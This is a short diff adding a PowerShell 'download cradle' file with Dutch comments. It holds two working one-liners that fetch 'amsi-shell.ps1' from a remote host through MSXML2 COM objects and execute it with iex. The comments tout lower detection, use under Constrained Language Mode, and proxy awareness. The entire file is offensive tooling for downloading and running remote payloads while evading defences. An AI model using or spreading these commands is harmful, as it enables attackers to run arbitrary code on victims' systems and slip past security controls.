@@ -1,0 +1,7 @@
+# PowerShell Download Cradle - XMLHTTP COM Object
+# Gebruikt MSXML2.XMLHTTP COM object (buiten .NET, minder gedetecteerd)
+$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://10.0.0.1/payloads/amsi-shell.ps1',$false);$h.send();iex $h.responseText
+# Alternatief met ServerXMLHTTP (gaat door proxy):
+$h=New-Object -ComObject Msxml2.ServerXMLHTTP;$h.open('GET','http://10.0.0.1/payloads/amsi-shell.ps1',$false);$h.send();iex $h.responseText
+# Tip: Werkt ook in Constrained Language Mode (COM objects toegestaan)
+# Tip: Proxy-aware via ServerXMLHTTP variant
